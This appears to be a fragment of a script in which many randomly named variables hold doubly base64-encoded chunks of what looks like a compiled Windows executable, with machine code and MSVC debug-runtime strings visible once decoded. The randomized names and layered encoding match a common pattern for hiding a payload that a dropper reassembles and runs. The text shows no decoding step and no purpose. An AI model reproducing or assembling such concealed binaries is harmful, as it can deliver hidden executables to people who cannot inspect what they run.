 XKfg = "aVVRa01FaUxSQ1FnU0lsRUpEaElqUVcxbkFBQVNJMU1KQ2hJaS9oSWkvRzVHQUFBQVBPa1NJdEVKQ0JJaVVRa1FFaUxSQ1FnU0lsRUpFaElpMFFrSUVpSlJDUlFTSTBGbHB3QUFFaU5UQ1JBU0l2NFNJdnh1UmdBQUFEenBNWUZYcHdBQUFHd0FVaUR4R2hmWHNQTXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek1TSWxNSkFoSWcreFlTSXRFSkdCSWlVUWtPRWlOQmJiRC92OUlpVVFrS0VpTFRDUW82RGY3Ly84UHRzQ0Z3SFVFTXNEclVraUxSQ1FvU0l0TUpEaElLOGhJaThGSWlVUWtRRWlMVkNSQVNJdE1KQ2pvQ1ByLy8waUpSQ1F3U0lOOEpEQUFkUVF5d09zZFNJdEVKRENMUUNRbEFBQUFnSVhBZEFReXdPc0lzQUhyQkRMQTZ3QklnOFJZdzh6TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek15SVRDUUlTSVBzS09oTzFQLy9oY0IxQXVzWEQ3WkVKRENGd0hRQzZ3d3p3RWlORFNtYkFBQklod0ZJZzhRb3c4ek16TXpNek16TXpNek16TXpNek16TWlGUWtFSWhNSkFoSWcrd29EN1lGQlpzQUFJWEFkQTBQdGtRa09JWEFkQVN3QWVzV0Q3Wk1KRERvOXRULy93KzJUQ1F3NkZ6VC8vK3dBVWlEeENqRHpNek16TXpNek16TXpNek16TXpNek14"
 cSdyVPVfGzkDXafOVvTFIWCFkfroRguXbaooHEMLvryMLhSqHl = "ek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNU0lsTUpBaElpVlFrRUV5SlJDUVlUSWxNSkNCVlYwaUI3RWdCQUFCSWpXd2tJRWlOZkNRZ3VSb0FBQUM0ek16TXpQT3JTSXVNSkdnQkFBQklpd1Yyc3dBQVNEUEZTSW1GR0FFQUFFaU5EV1FEQVFEb3VmYi8vMGlOaFVnQkFBQklpVVVvdVFFQUFBRC9GVkwyQUFCTWkwMG9SVFBBU0l1VlFBRUFBRWlMeU9pRjlQLy9pVVVFU01kRktBQUFBQUNMUlFTTCtFaU5UZUJJalJVUmp3QUE2QW4yLy8rTHgwaUxqUmdCQUFCSU04M29wUFQvLzBpTnBTZ0JBQUJmWGNQTXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek1TSVBzQ0V5THlVaUZ5WFFxU0lYU2RDVk5oY0IwSUVpSlBDU3d6RWlMK1VpTHl2T3FTWXNBU0lzOEpFbUpRUVJKaVZFTVRZa0lTSVBFQ01QTXpNek16TXpNek16TXpNek16TXpNek16TXpNeElpVndrRUVpSmJDUVlWa2lEN0NBejIwaUw4a2lMNlRrYWZsWklpWHdrTUl2N0R4OUFBR1ptRHgrRUFBQUFBQUJJaTFZSVNHTU1Pb0Y4S2Z6"
 pmyRvIoaiAdTnm = "TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpDQUFETXpNek16TXpNek16TXpNek1RRlZYU0lIczZBQUFBRWlOYkNRZ1NJME5Ud2dCQU9pbSsvLy9TSTBGcnJrQUFFaU5wY2dBQUFCZlhjUE16TXpNek16TXpNek16TXpNek16TXpN"
 LUAoboTgsNfGwzgqMmwAGNgNPEHQiyGMldsAGKiidxDSFGAXcwjrYrbnpzEIlOcnGHPSv = "TmpDU0FCd0FBaGNDSmJDUW9TSTBGZm9RQUFFaUwwMGlKUkNRZ1RBOUV6MG1MeGtTTFJDUkFRWXZNL3hWUkFnRUFnL2dCZFFITVNJdTBKS2dPQUFCSWk0d2trQTRBQUVnenpPaTg0Ly8vU0lIRXNBNEFBRUZmUVY1QlhVRmNYMTFidzh6TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXhJZyt3b1RJdkpNOUpFalVJRnVZZ1RiVUQvRlZqaEFBRHJBRWlEeENqRHpNek16TXpNek16TXpNek16TXpNek14SWlWd2tFRmRJZ2V3d0JBQUFTSXNGSktFQUFFZ3p4RWlKaENRZ0JBQUFpejB2b1FBQVNJdlpnLy8vZEhkSWhjbDBWdWg1L1AvL1NJUEFPa2c5QUFRQUFIZEZUSTBGYm40QUFMb0FCQUFBU0kxTUpDRG82dUgvLzB5THcwaU5UQ1FndWdBRUFBRG8yZUQvLzB5TkJWWitBQUM2QUFRQUFFaU5UQ1FnNk1QZy8vOU1qVXdrSU9zSFRJME5lWVFBQUVpTGpDUTRCQUFBUWJnREFBQUFpOWZvTFB6Ly8waUxqQ1FnQkFBQVNEUE02Q1hpLy85SWk1d2tTQVFBQUVpQnhEQUVBQUJmdzh6TXpN"
 dPHPpts = "TW9CQU1CQUFRRFZRQUVBZU1vQkFDQkJBUUJsUVFFQWdNb0JBSUJCQVFDbFFRRUFpTW9CQVBCQkFRQ0NRd0VBdU1vQkFQQkRBUUJCUkFFQWtNb0JBR0JFQVFCdVJBRUFxTW9CQUpCRUFRQTJSUUVBb01vQkFHQkZBUUIyUlFFQXNNb0JBSkJGQVFBcVJnRUF5TW9CQUZCR0FRQ1NSZ0VBME1vQkFMQkdBUUR5UmdFQTRNb0JBQ0JIQVFBK1J3RUE4TW9CQUZCSEFRQm9Sd0VBK01vQkFIQkhBUUNOUndFQUdNc0JBS0JIQVFERFJ3RUFJTXNCQU9CSEFRQUdTQUVBS01zQkFCQklBUUE0U0FFQUVNc0JBRkJJQVFDN1NBRUFDTXNCQU9CSUFRQWZTUUVBT01zQkFEQkpBUUIxU1FFQVFNc0JBTEJKQVFENFNRRUFTTXNCQUJCS0FRQjVTZ0VBTU1zQkFLQktBUURYU2dFQUFNc0JBQUJMQVFCY1RBRUFzTXNCQU1CTUFRQnVUd0VBYk1zQkFDQlFBUUFqVVFFQWxNc0JBSEJSQVFBMlZRRUFVTXNCQURCV0FRRFZXUUVBeE1zQkFNQmFBUURsV2dFQTJNc0JBS0J3QVFDaWNBRUE0TXNCQU1Cd0FRREdjQUVBNk1zQkFOQ0FBUUFBZ1FFQUFNZ0JBQkNCQVFBd2dRRUE0TWdCQUVDQkFRQjlnUUVBNE1rQkFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFB"
 nakYwagVroMrOEfsteXllfcoBvAuNAdrwdDlgazyqsgPKtEegoCIwCUjGupYfo = "TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFB"
 obbOsgvhpNXIcdbYdkGYIaNBBcElKifCqpgxJTckSeauwtfbPgNfLQBUR = "TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpN"
 GuQxrSYxJGddVXCHQpGAWAkiZgqPUKwPHBncITqQUblgcwlHmQqactoHwqrduW = "ek16TVRJbEVKQmlKVkNRUWlVd2tDRWlEN0RpNUZ3QUFBUDhWQk4wQUFJWEFkQWlMUkNSQWk4ak5LVWlORFlHZUFBRG9MQUVBQUVpTFJDUTRTSWtGYUo4QUFFaU5SQ1E0U0lQQUNFaUpCZmllQUFCSWl3VlJud0FBU0lrRndwMEFBTWNGcUowQUFBa0VBTURIQmFLZEFBQUJBQUFBZzN3a1NBQjJFRWlEZkNSUUFIVUl4MFFrU0FBQUFBQ0RmQ1JJRG5ZS2kwUWtTUC9JaVVRa1NJdEVKRWovd0lrRmdwMEFBTGdJQUFBQVNHdkFBRWlORFhxZEFBQ0xWQ1JBU0lrVUFjZEVKQ0FBQUFBQTZ3cUxSQ1FnLzhDSlJDUWdpMFFrU0RsRUpDQnpJb3RFSkNDTFRDUWcvOEdMeVVpTkZVR2RBQUJNaTBRa1VFbUxCTUJJaVFUSzY4cElqUTJMZ0FBQTZGRGQvLzlJZzhRNHc4ek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpFaUpUQ1FJU0lQc2VFaUxqQ1NBQUFBQS94VWgyd0FBU0l1RUpJQUFBQUJJaTRENEFBQUFTSWxFSkVoRk04QklqVlFrVUVpTFRDUkkveFVDMndBQVNJbEVKRUJJZzN3a1FBQjBRVWpIUkNRNEFBQUFBRWlOUkNSWVNJbEVKREJJalVRa1lFaUpSQ1FvU0l1RUpJQUFBQUJJaVVRa0lFeUxUQ1JBVEl0RUpFaElpMVFrVURQSi94VzgyZ0FBU0lQRWVNUE16TXpNek16"
 ckZbelCalPLDXKtBcWmESQNZktlvc = "QUJBQUFBNndqSFJDUVFBQUFBQUErMlJDUVFpRVFrQ0xnQkFBQUFNOGtQb2t5TlJDUWdRWWtBUVlsWUJFR0pTQWhCaVZBTXVBUUFBQUJJYThBQWkwUUVJSWxFSkFRUHRnUWtoY0FQaElVQUFBQkl4d1crZUFBQUFJQUFBRWpIQmJ0NEFBRC8vLy8vaTBRa0JDWHdQLzhQUGNBR0FRQjBVSXRFSkFRbDhELy9EejFnQmdJQWRFQ0xSQ1FFSmZBLy93ODljQVlDQUhRd2kwUWtCQ1h3UC84UFBWQUdBd0IwSUl0RUpBUWw4RC8vRHoxZ0JnTUFkQkNMUkNRRUpmQS8vdzg5Y0FZREFIVVBpd1hCZ0FBQWc4Z0JpUVc0Z0FBQXVBUUFBQUJJYThBRHVRUUFBQUJJYThrQWkwUUVJSWxFRERDNEJBQUFBRWhyd0FLNUJBQUFBRWhyeVFHTFJBUWdpVVFNTUlOOEpCUUhmRnk0QndBQUFEUEpENkpNalVRa0lFR0pBRUdKV0FSQmlVZ0lRWWxRRExnRUFBQUFTR3ZBQWJrRUFBQUFTR3ZKQW90RUJDQ0pSQXd3dUFRQUFBQklhOEFCaTBRRUlDVUFBZ0FBaGNCMEQ0c0ZLb0FBQUlQSUFva0ZJWUFBQU1jRm0zY0FBQUVBQUFESEJaVjNBQUFDQUFBQXVBUUFBQUJJYThBQmkwUUVNQ1VBQUJBQWhjQVBoUDhBQUFESEJXMTNBQUFDQUFBQWl3VnJkd0FBZzhnRWlRVmlkd0FBdUFRQUFBQklhOEFCaTBRRU1DVUFBQUFJaGNBUGhNd0FBQUM0QkFBQUFFaHJ3QUdMUkFRd0pRQUFBQkNGd0ErRXNnQUFBRFBKRHdIUVNNSGlJRWdMMEVpTHdraUpS"
 jlpDVEFMxbmONUlkfhGVHkOoOeMLXzAiLonunWnRvNQVlCIwuxiKrkHC = "bElDTWxaQ0F0SUNWekFBQUFBQUFBQUFBQVUzUmhZMnNnWTI5eWNuVndkR1ZrSUc1bFlYSWdkVzVyYm05M2JpQjJZWEpwWVdKc1pRQUFBQUFBQUFBQUFBQUFKUzR5V0NBQUFBQlRkR0ZqYXlCaGNtVmhJR0Z5YjNWdVpDQmZZV3hzYjJOaElHMWxiVzl5ZVNCeVpYTmxjblpsWkNCaWVTQjBhR2x6SUdaMWJtTjBhVzl1SUdseklHTnZjbkoxY0hSbFpBb0FBQUFBQUFBQUFBQUFBQUFBQUFBQUNnQUFBRDRnQUFBS1JHRjBZVG9nUEFBQUFBQUFBQUFBQ2tGc2JHOWpZWFJwYjI0Z2JuVnRZbVZ5SUhkcGRHaHBiaUIwYUdseklHWjFibU4wYVc5dU9pQUFBQUFBQUFBQUFBQUFBQUFBQUFBS1UybDZaVG9nQUFBQUFBQUFBQUFBQ2tGa1pISmxjM002SURCNEFBQUFBQUFBQUFBQUFBQUFVM1JoWTJzZ1lYSmxZU0JoY205MWJtUWdYMkZzYkc5allTQnRaVzF2Y25rZ2NtVnpaWEoyWldRZ1lua2dkR2hwY3lCbWRXNWpkR2x2YmlCcGN5QmpiM0p5ZFhCMFpXUUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFDVnpKWE1sY0NWekpYcGtKWE1sWkNWekpYTWxjeVZ6SlhNQUFBQUFBQUFBUVNCMllYSnBZV0pzWlNCcGN5QmlaV2x1WnlCMWMyVmtJSGRwZEdodmRYUWdZbVZwYm1jZ2FXNXBkR2xoYkdsNlpXUXVBQUFBQUFBQUFBQUFBQUFBQUVpMEFVQUJBQUFBYUxRQlFBRUFBQUNndEFGQUFRQUFBTUMwQVVBQkFBQUErTFFCUUFFQUFB"
 ywxosoczblRtUvLuDXsaqcuOFPontRjdwaJORUTYjIHHsPWSrBE = "ek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16"
 haZjvFCfAaX = "TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpN"
 vZPlUyTjdULcGVTHUmzRSXXszQRFjEUoLeWjZVFPOiGNyOFRpRJIvSjDGmk = "QUFBQUFBQUFBQUFBQUFBTXpNek16TTZYQkxBQURwQzBzQUFPazhGZ0FBNloxTEFBRHBZalVBQU9uaFN3QUE2ZFpMQUFEcGN3Y0FBT20wU3dBQTZibEtBQURwMURZQUFPbGZEd0FBNlZvZ0FBRHBTVXdBQU9uQUtBQUE2YnN3QUFEcEZFc0FBT24zU2dBQTZWeE1BQURwSnlFQUFPbXlOZ0FBNlhsTEFBRHBHREFBQU9tN1NnQUE2ZjR2QUFEcEdVd0FBT2xrVEFBQTZmOGZBQURweGtvQUFPbG5TZ0FBNlRBZUFBRHBHMkFBQU9uR0xBQUE2WkV2QUFEcDdDOEFBT2tYVEFBQTZkSTRBQURwYlJVQUFPbllYd0FBNmFOTEFBRHAvZzhBQU9uWlN3QUE2ZVFmQUFEcC95a0FBT25hSVFBQTZmVkxBQURwb0RRQUFPa2ZTZ0FBNmZZZkFBRHBYMHNBQU9sOE5BQUE2WmM1QUFEcDhpOEFBT205SHdBQTZaaEtBQURwdlVvQUFPbDhTZ0FBNlI5TEFBRHBSRFlBQU9tUEZBQUE2UVJMQUFEcDVTc0FBT21BU1FBQTZjc2ZBQURwNWlvQUFPa2hMUUFBNlN3UEFBRHBaMHNBQU9tQ0JnQUE2ZTAxQUFEcHdFb0FBT20vU1FBQTZWNUxBQURwZ1VvQUFPbGtTd0FBNlJGS0FBRHAyaTRBQU9uSFNnQUE2U0JMQUFEcHV3b0FBT25PU1FBQTZlOUtBQURwYkN3QUFPazNMd0FBNlhJUUFBRHBRRXNBQU9rb1NnQUE2V01YQUFEcHVrb0FBT212U2dBQTZXUTNBQURwOFVrQUFPbHVTUUFBNlpVdUFBRHBFRXNBQU9sckxnQUE2Wll5QUFEcFVSOEFB"
 tTcokkYimbNUQxVmaFGdwTJuSZjxeiJMAFbGsSCr = "QUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFB"
 jCDGmeITNx = "QUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFB"
 BHGCUEAlNjHwSYAoKMdtxBsHfu = "ek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16"
 QCvxYrufwAwJmOgajhdubCnaXlXrdAifKoAZVqfIMhXUSnFsJEpGx = "ek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNekdabUR4K0VBQUFBQUFELzRNek16TXpNek16TXpNek16TXpNek16TXpNek1abVlQSDRRQUFBQUFBUDhsV3I4QUFNek16TXpNek16TXpNek16TXpNek16TXpNek16"
 yPeffAvpRkwnFgAvycVKfbTZwpVyPepiOGTNCcceUpvsiQCbKCeQmFYmr = "ek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16"
